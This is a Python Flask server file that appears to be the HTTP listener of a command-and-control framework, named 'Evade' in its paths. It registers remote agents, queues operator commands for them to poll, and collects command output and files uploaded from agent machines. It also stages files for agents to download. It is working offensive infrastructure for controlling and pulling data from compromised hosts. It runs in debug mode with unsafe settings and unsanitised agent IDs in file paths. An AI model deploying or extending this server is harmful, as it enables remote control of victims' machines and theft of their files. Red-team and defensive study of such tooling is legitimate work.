import os
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO
from werkzeug.utils import secure_filename
from database import Session, Agent
import requests
import time

app = Flask(__name__)
socketio = SocketIO(app)

# Define separate directories for uploads and downloads
BASE_DIR = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE'
UPLOADS_FOLDER = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\uploads'
DOWNLOADS_FOLDER = os.path.join(BASE_DIR, 'downloads_from_http_https_agents')

app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER
app.config['DOWNLOADS_FOLDER'] = DOWNLOADS_FOLDER

# Ensure both directories exist
os.makedirs(UPLOADS_FOLDER, exist_ok=True)
os.makedirs(DOWNLOADS_FOLDER, exist_ok=True)

agents = {}

@app.route('/tryhai',methods=['GET'])
def tryni():
    return jsonify("Working nginx")

def notify_flask_about_agent_connection(agent_id, agent_name,addr):
    url = 'http://localhost:5002/api/notify-agent-connection'
    data = {
        'agent_id': agent_id,
        'agent_name': agent_name,
        'addr' : addr
    }
    try:
        requests.post(url, json=data)
        print(f"Agent {agent_name} ({agent_id}) connected and notified to Flask app.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to notify Flask app: {e}")

@app.route('/register', methods=['POST'])
def register_agent():
    addr = request.remote_addr
    agent_id = request.form.get('agent_id')

    if not agent_id:
        print("Agent ID not received.")
        return jsonify({'error': 'Missing agent ID'}), 400

    try:
        agents[agent_id] = {'command': '', 'files': []}
        with Session() as session:
            agent = session.query(Agent).filter_by(agent_id=agent_id).first()
            if agent:
                agent_name = agent.extra_data.get("name", "Unknown")
                print(f"Agent {agent_id} recognized with name {agent_name}.")
                notify_flask_about_agent_connection(agent_id, agent_name, addr)
                return jsonify({'message': 'Agent recognized and information logged'}), 200
            else:
                print(f"Unrecognized agent: {agent_id}. Connection refused.")
                return jsonify({'error': 'Agent not recognized'}), 404
    except Exception as e:
        print(f"Error handling agent connection: {e}")
        return jsonify({'error': 'Internal server error'}), 500

    # Fallback return, in case none of the above conditions are met
    return jsonify({'error': 'Unexpected error occurred'}), 500


@app.route('/send_command', methods=['POST'])
def send_command():
    # Print existing agents for debugging
    print("Current agents:", agents)

    # Accessing data from the POST request
    if request.is_json:
        data = request.get_json()
        agent_id = data.get('agentId')
        command = data.get('command')
    else:
        agent_id = request.form.get('agentId')
        command = request.form.get('command')

    # Debugging print to see what data is received
    print("Received data:", data if request.is_json else request.form)

    # Processing the command if the agent is found
    if agent_id in agents:
        agents[agent_id]['command'] = command
        print(f"Command set for agent {agent_id}: {command}")  # More specific print statement
        return jsonify({'message': 'Command sent successfully'}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/get_command', methods=['GET'])
def get_command():
    agent_id = request.args.get('agent_id')
    if agent_id in agents:
        command = agents[agent_id].get('command', '')
        return jsonify({'command': command}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/send_output', methods=['POST'])
def send_output():
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    if not agent_id:
        return jsonify({'error': 'Missing agent ID'}), 400

    if 'file' in request.files:
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
        filename = secure_filename(file.filename)
        # Save to DOWNLOADS_FOLDER since it's from agent to server
        filepath = os.path.join(DOWNLOADS_FOLDER, agent_id, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        try:
            file.save(filepath)
            socketio.emit('file_received', {'filename': filename, 'agent_id': agent_id})
            return jsonify({'message': 'File received successfully'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        output = request.form.get('output')
        if not output:
            return jsonify({'error': 'Missing output data'}), 400
        #data_to_send = {'agent_id': agent_id, 'output': output}
        data_to_send = {'agent_id': agent_id, 'output': output, 'command': command}  # Include command in the data sent
        response = requests.post('http://127.0.0.1:5002/api/receive-results', json=data_to_send)
        if response.status_code == 200:
            return jsonify({'message': 'Output sent successfully to main backend'}), 200
        else:
            return jsonify({'error': 'Failed to send data to main backend'}), 500
        #print(output)
        #socketio.emit('output_received', {'output': output, 'agent_id': agent_id})
        #return jsonify({'message': 'Output received successfully'}), 200

@app.route('/agents', methods=['GET'])
def get_agents():
    return jsonify({'agents': list(agents.keys())}), 200

@app.route('/upload', methods=['POST'])
def upload_file():
    agent_id = request.form.get('agent_id')
    if 'file' in request.files and agent_id:
        file = request.files['file']
        filename = secure_filename(file.filename)
        # Save to UPLOADS_FOLDER since it's server to agent
        filepath = os.path.join(UPLOADS_FOLDER, agent_id, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        file.save(filepath)
        socketio.emit('upload_to_agent', {'filename': filename, 'agent_id': agent_id})
        return jsonify({'message': f'File {filename} uploaded successfully to agent {agent_id}'}), 200
    return jsonify({'error': 'Upload failed, missing file or agent ID'}), 400

# Add this route to server.py for the agent to download the uploaded files
@app.route('/fetch_file/<agent_id>/<filename>', methods=['GET'])
def fetch_file(agent_id, filename):
    filepath = os.path.join(UPLOADS_FOLDER, agent_id, filename)
    if os.path.exists(filepath):
        return send_from_directory(os.path.dirname(filepath), filename, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404
        
@app.route('/list_files/<agent_id>', methods=['GET'])
def list_files_for_agent(agent_id):
    agent_dir = os.path.join(UPLOADS_FOLDER, agent_id)
    if os.path.exists(agent_dir):
        files = [f for f in os.listdir(agent_dir) if os.path.isfile(os.path.join(agent_dir, f))]
        return jsonify({'files': files}), 200
    else:
        return jsonify({'error': 'No files found for the specified agent'}), 404

if __name__ == '__main__':
    # Run the app
    #socketio.run(app, debug=True, host='0.0.0.0', port=5001)
    socketio.run(app, debug=True, port=5678,allow_unsafe_werkzeug=True)
